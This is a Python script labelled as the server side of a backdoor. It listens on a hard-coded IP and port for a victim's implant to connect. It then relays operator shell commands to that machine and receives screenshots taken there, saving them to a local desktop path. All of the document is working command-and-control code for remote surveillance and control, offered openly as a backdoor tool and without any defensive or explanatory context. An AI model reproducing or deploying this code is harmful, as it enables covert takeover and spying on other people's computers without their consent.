#Screen shoot Server Side BackDoor Script

import socket
import os

def connecting():
    HOST = '192.168.43.85'
    PORT = 8080
    
    with socket.socket() as s:
        s.bind((HOST,PORT))
        s.listen(1)
        print("[+] Listening for incoming TCP connection on port 8080: ")
        
        conn, addr = s.accept()
        print("[+] We got a connection from: ", addr)
        while True:
            command = input("[@Shell]==> ")
            if 'terminate' in command:
                conn.send('terminate'.encode())
                break
            elif 'shot' in command:
                conn.send('shot'.encode())
                file_path = '/home/moe/Desktop/Screenshot.jpg' #Path to save the screenshot
                with open(file_path, 'wb') as f:
                    while True:
                        bits = conn.recv(1024)
                        if bits.endswith(b'DONE'):
                            f.write(bits[:-4])
                            f.close()
                            print(f"[+] The Screenshot received and saved on {file_path}")
                            break
                        f.write(bits)
            else:
                conn.send(command.encode())
                print(conn.recv(1024).decode())
                
def main():
    connecting()
main()
                